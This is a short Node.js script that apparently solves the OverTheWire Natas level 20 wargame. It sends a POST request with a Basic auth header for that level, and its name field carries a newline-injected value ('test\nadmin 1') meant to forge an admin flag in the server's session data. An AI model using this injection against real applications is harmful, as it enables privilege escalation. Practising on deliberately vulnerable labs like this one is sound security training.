const axios = require("axios");

const targetURL = "http://natas20.natas.labs.overthewire.org/index.php";
const authHeader =
  "Basic bmF0YXMyMDpndVZhWjNFVDM1TGJnYkZNb2FONXRGY1lUMWpFUDdVSA==";

const findPassword = async () => {
  const completeURL = targetURL;
  try {
    const response = await axios.post(
      completeURL,
      { name: "test\nadmin 1" },
      {
        headers: { Authorization: authHeader },
      }
    );
    console.log(response.data);
  } catch (error) {
    if (error) {
      console.log(error.response.data);
    }
  }
};

findPassword();
